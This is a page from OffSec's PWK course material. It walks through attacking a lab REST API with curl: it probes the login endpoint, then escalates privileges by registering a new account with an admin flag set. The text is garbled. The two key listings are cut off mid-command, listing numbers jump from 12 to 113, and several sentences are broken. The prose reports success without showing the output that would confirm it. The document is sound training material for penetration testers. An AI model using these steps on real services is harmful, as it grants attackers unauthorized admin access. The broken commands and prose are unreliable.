# OffSec

Next, we will try to convert the GET request into a POST and provide our payload in the JSON format. Let's craft our request by first specifying the admin username and dummy password as JSON via the -d parameter. We'll also specify "json" as the "Content-Type" by specifying a header with -H

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:application/json' http://192.168.0.50:5002/users/v1/login { "status":"fail","message":"Password is not correct for the given username."}
```

Listing 12 - Crafting a POST request after the login API

The API return shows that the authentication failed, meaning that the API parameters are correctly formed.

Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface.

Let's try registering a new user with the password by JSON syntax that specifies the desired username and password:

```
kali@kali:~$ curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type:application/json' http://192.168.0.50:5002/users/v1/register { "status":"fail","message":"email is a required property"}
```

Listing 113 - Attempting new Registration

The API replied with a message stating that we should also include an email address. We could take this opportunity to determine if we can obtain access key. Let's add the admin key, by a True value.

```
kali@kali:~$ curl -d '{"password":"lab"
```

Listing 114 - Attempting to register as a new user

Since we received no error, we were able to register a new user as an admin, which should not be denied by policy. Next, let's try to log in the credentials using just the login API we discovered.

```
kali@kali:~$ curl -d '{"password":"lab"
```

Listing 115 - Logging in an admin user

356 (Mozilla, 2022), https://developer.mozilla.org/en-US/docs/learn/JavaScript/Objects/JSON

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

229